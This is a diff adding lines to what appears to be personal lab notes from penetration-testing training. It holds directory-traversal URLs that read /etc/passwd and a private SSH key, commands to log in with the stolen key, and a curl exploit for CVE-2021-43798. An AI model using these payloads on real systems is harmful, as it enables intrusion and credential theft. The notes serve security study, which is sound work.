@@ -40,7 +40,26 @@ curl -X 'PUT' \
 ```
 # XSS 
 
+# Directory traversal
+```
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+```
+```
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+```
 
+## use their ssh key
+```
+vim dt_key
+chmod 400 dt_key
+ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+
+```
+## CVE-2021-43798
+```
+curl --path-as-is http://192.168.249.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
+
+```
 
 # Checklist
 get application/version 
